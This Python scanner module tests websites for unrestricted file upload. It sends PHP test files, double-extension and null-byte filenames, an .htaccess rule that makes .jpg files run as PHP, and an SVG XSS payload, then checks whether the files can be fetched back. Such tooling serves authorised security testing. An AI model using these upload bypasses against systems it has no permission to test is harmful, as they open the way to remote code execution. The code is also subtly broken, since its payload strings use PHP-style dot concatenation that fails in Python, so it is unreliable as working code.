#!/usr/bin/env python3
"""
Unrestricted File Upload vulnerability scanner.
Tests for file upload vulnerabilities that can lead to RCE.

References:
    - OWASP: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
    - CWE-434: Unrestricted Upload of File with Dangerous Type
"""

import os
import random
import string
from typing import Dict, List, Optional
from urllib.parse import urljoin
from loguru import logger


class Scanner:
    """Unrestricted File Upload vulnerability scanner."""
    
    def __init__(self, browser, target_url: str, config: Dict):
        """
        Initialize file upload scanner.
        
        Args:
            browser: StealthBrowser instance
            target_url: Target URL to scan
            config: Configuration dictionary
        """
        self.browser = browser
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.findings = []
        self.module_name = "Unrestricted File Upload"
        
        # Test file types
        self.test_files = {
            'php': {
                'filename': 'test.php',
                'content': '<?php echo "SECURITY_TEST_'.self._random_string().'"; ?>',
                'content_type': 'application/x-php',
                'dangerous': True,
            },
            'php5': {
                'filename': 'test.php5',
                'content': '<?php echo "SECURITY_TEST_'.self._random_string().'"; ?>',
                'content_type': 'application/x-php',
                'dangerous': True,
            },
            'phtml': {
                'filename': 'test.phtml',
                'content': '<?php echo "SECURITY_TEST_'.self._random_string().'"; ?>',
                'content_type': 'application/x-httpd-php',
                'dangerous': True,
            },
            'php_double_ext': {
                'filename': 'test.php.jpg',
                'content': '<?php echo "SECURITY_TEST_'.self._random_string().'"; ?>',
                'content_type': 'image/jpeg',
                'dangerous': True,
            },
            'php_null_byte': {
                'filename': 'test.php%00.jpg',
                'content': '<?php echo "SECURITY_TEST_'.self._random_string().'"; ?>',
                'content_type': 'image/jpeg',
                'dangerous': True,
            },
            'htaccess': {
                'filename': '.htaccess',
                'content': 'AddType application/x-httpd-php .jpg',
                'content_type': 'text/plain',
                'dangerous': True,
            },
            'config': {
                'filename': 'config.php',
                'content': '<?php echo "SECURITY_TEST_'.self._random_string().'"; ?>',
                'content_type': 'application/x-php',
                'dangerous': True,
            },
            'svg_xss': {
                'filename': 'test.svg',
                'content': '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
    <rect width="100" height="100" fill="red"/>
</svg>''',
                'content_type': 'image/svg+xml',
                'dangerous': False,
            },
        }
    
    def _random_string(self, length: int = 8) -> str:
        """Generate random string for unique markers."""
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    def run(self) -> Dict:
        """
        Execute file upload tests.
        
        Returns:
            Dict with findings and test results
        """
        logger.info(f"Starting {self.module_name} scan")
        
        result = {
            'module': self.module_name,
            'upload_forms_tested': [],
            'vulnerable_uploads': [],
            'findings': []
        }
        
        # Find file upload forms
        upload_forms = self._find_upload_forms()
        
        for form in upload_forms:
            result['upload_forms_tested'].append({
                'action': form['action'],
                'field_name': form['file_field']
            })
            
            # Test each dangerous file type
            vulnerabilities = self._test_upload_form(form)
            
            if vulnerabilities:
                result['vulnerable_uploads'].extend(vulnerabilities)
        
        # Generate findings
        for vuln in result['vulnerable_uploads']:
            self.findings.append({
                'title': f"Unrestricted File Upload - {vuln['file_type']} file accepted",
                'severity': 'critical' if vuln.get('executable', False) else 'high',
                'description': (
                    f"The file upload form at {vuln['action']} accepts {vuln['file_type']} files. "
                    f"Uploaded file: {vuln['filename']}. "
                    f"{'This file type can be executed on the server, leading to remote code execution.' if vuln.get('executable') else ''}"
                ),
                'recommendation': (
                    "1. Validate file types using allowlist approach\n"
                    "2. Check both file extension and MIME type\n"
                    "3. Store uploaded files outside web root\n"
                    "4. Rename uploaded files with random names\n"
                    "5. Set proper permissions on upload directory\n"
                    "6. Scan uploaded files for malware\n"
                    "7. Limit file size\n"
                    "8. Use CDN/object storage for user uploads"
                ),
                'module': self.module_name,
                'cwe_id': 'CWE-434',
                'cvss_score': 9.8 if vuln.get('executable') else 7.5,
                'evidence': f"Successfully uploaded {vuln['filename']} via {vuln['action']}",
                'references': [
                    'https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload',
                    'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html',
                ]
            })
        
        result['findings'] = self.findings
        
        logger.info(f"{self.module_name} complete. Found {len(self.findings)} vulnerabilities")
        return result
    
    def _find_upload_forms(self) -> List[Dict]:
        """Find file upload forms."""
        forms = []
        
        # Common upload endpoints
        upload_paths = [
            '/upload', '/uploads', '/file/upload', '/api/upload',
            '/admin/upload', '/media/upload', '/image/upload',
            '/profile/photo', '/avatar/upload', '/attachment',
            '/import', '/bulk-upload', '/file-upload',
        ]
        
        for path in upload_paths:
            resp = self.browser.get(path)
            if resp and resp.status_code == 200:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                for form in soup.find_all('form'):
                    file_inputs = form.find_all('input', {'type': 'file'})
                    if file_inputs:
                        forms.append({
                            'action': urljoin(self.target_url, form.get('action', path)),
                            'method': form.get('method', 'post'),
                            'file_field': file_inputs[0].get('name', 'file'),
                            'enctype': form.get('enctype', 'multipart/form-data'),
                        })
        
        return forms[:5]
    
    def _test_upload_form(self, form: Dict) -> List[Dict]:
        """
        Test an upload form with various file types.
        
        Args:
            form: Form information dict
        
        Returns:
            List of vulnerability dicts
        """
        vulnerabilities = []
        
        # Skip non-POST forms
        if form['method'].lower() != 'post':
            return vulnerabilities
        
        # Test each dangerous file type
        for file_type, file_info in self.test_files.items():
            if not file_info['dangerous']:
                continue
            
            uploaded_url = self._upload_file(
                form['action'],
                form['file_field'],
                file_info['filename'],
                file_info['content'],
                file_info['content_type']
            )
            
            if uploaded_url:
                vulnerabilities.append({
                    'action': form['action'],
                    'file_type': file_type,
                    'filename': file_info['filename'],
                    'uploaded_url': uploaded_url,
                    'executable': file_type in ['php', 'php5', 'phtml', 'config'],
                })
                
                logger.info(f"File upload vulnerability: {file_type} accepted at {form['action']}")
                
                # Only report once per form
                break
        
        return vulnerabilities
    
    def _upload_file(
        self, 
        url: str, 
        field_name: str, 
        filename: str, 
        content: str,
        content_type: str
    ) -> Optional[str]:
        """
        Upload a file and check if it's accessible.
        
        Args:
            url: Upload endpoint URL
            field_name: Name of the file input field
            filename: Name of the file to upload
            content: File content
            content_type: MIME type to use
        
        Returns:
            URL of uploaded file if accessible, None otherwise
        """
        try:
            import io
            
            # Create file-like object
            file_obj = io.BytesIO(content.encode('utf-8'))
            
            files = {
                field_name: (filename, file_obj, content_type)
            }
            
            # Upload the file
            resp = self.browser.post(url, files=files)
            
            if not resp or resp.status_code not in [200, 201, 302]:
                return None
            
            # Try to find uploaded file URL from response
            uploaded_url = self._extract_upload_url(resp.text, filename)
            
            if uploaded_url:
                # Verify the file is accessible
                check_resp = self.browser.get(uploaded_url)
                if check_resp and check_resp.status_code == 200:
                    if content[:50] in check_resp.text:
                        return uploaded_url
            
            # Try common upload paths
            upload_paths = [
                f'/uploads/{filename}',
                f'/upload/{filename}',
                f'/files/{filename}',
                f'/media/{filename}',
                f'/images/{filename}',
                f'/wp-content/uploads/{filename}',
            ]
            
            for path in upload_paths:
                check_url = urljoin(self.target_url, path)
                check_resp = self.browser.get(check_url)
                if check_resp and check_resp.status_code == 200:
                    if content[:50] in check_resp.text:
                        return check_url
            
        except Exception as e:
            logger.error(f"File upload test failed: {e}")
        
        return None
    
    def _extract_upload_url(self, response_text: str, filename: str) -> Optional[str]:
        """
        Extract uploaded file URL from response.
        
        Args:
            response_text: Response body
            filename: Original filename
        
        Returns:
            Extracted URL or None
        """
        # Look for the filename in JSON responses
        import json
        
        # Try JSON parsing
        try:
            data = json.loads(response_text)
            
            # Check common JSON keys for file URLs
            url_keys = ['url', 'file', 'path', 'link', 'src', 'location', 'href']
            for key in url_keys:
                if key in data:
                    url = str(data[key])
                    if url.startswith('http'):
                        return url
                    if url.startswith('/'):
                        return urljoin(self.target_url, url)
            
            # Check nested data
            for key in ['data', 'file', 'result', 'response']:
                if key in data and isinstance(data[key], dict):
                    for url_key in url_keys:
                        if url_key in data[key]:
                            url = str(data[key][url_key])
                            if url.startswith('http'):
                                return url
                            if url.startswith('/'):
                                return urljoin(self.target_url, url)
        except (json.JSONDecodeError, ValueError):
            pass
        
        # Look for URL patterns in HTML/plain text
        import re
        url_patterns = [
            rf'https?://[^"\'\s]+{re.escape(filename)}',
            rf'/[^"\'\s]+{re.escape(filename)}',
            rf'src="([^"]*{re.escape(filename)}[^"]*)"',
            rf'href="([^"]*{re.escape(filename)}[^"]*)"',
        ]
        
        for pattern in url_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                url = match.group(0) if match.lastindex is None else match.group(1)
                if url.startswith('http'):
                    return url
                if url.startswith('/'):
                    return urljoin(self.target_url, url)
        
        return None